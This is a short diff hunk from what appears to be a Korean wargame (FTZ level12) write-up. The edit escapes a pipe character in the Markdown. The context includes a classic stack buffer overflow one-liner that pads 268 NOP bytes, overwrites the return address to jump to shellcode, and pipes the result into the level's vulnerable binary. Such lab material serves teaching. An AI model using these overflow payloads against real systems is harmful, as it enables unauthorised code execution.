@@ -176,7 +176,7 @@ NOP으로 268 byte를 채우고 RET에 EGG 환경 변수 위치한 주소(=쉘�
 
 <img data-action="zoom" src='{{ "assets/ftz/level12/13.png" | relative_url }}' alt='relative'>  
 
-실행하는 프로그램에서 표준 입력 받는 부분을 실행시 입력하기 위해선 파이프라인('|')을 사용해야 합니다.  
+실행하는 프로그램에서 표준 입력 받는 부분을 실행시 입력하기 위해선 파이프라인('\|')을 사용해야 합니다.  
 
 ``` bash
 (python -c 'print "\x90"*268+"\x88\xfc\xff\xbf"'; cat) | ./attackme
